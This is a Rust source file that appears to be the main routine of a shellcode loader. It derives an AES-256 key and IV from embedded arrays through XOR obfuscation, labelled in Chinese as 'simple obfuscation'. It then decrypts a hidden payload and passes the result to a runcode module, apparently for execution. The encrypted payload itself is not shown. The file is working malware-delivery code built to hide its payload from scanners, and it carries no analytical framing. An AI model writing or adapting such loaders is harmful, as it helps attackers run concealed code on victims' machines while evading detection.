mod data_tmp;
mod runcode;

use openssl::symm::{decrypt, Cipher};

fn main() {

    let (d1, d2, d3, d4) = data_tmp::getdata();

    // 简单混淆
    let newiv: [u8; 16] = d3
        .into_iter()
        .zip(d2.clone())
        .map(|(a, b)| a ^ b ^ 5 << 3)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();
    let newkey: [u8; 32] = d2
        .into_iter()
        .zip(d4)
        .map(|(a, b)| a ^ b ^ 5 >> 1)
        .collect::<Vec<u8>>()
        .as_slice()
        .try_into()
        .unwrap();

    let cipher = Cipher::aes_256_cbc();
    let plaintext = decrypt(cipher, &newkey, Some(&newiv), d1.as_slice()).unwrap();

    runcode::run(plaintext);

}
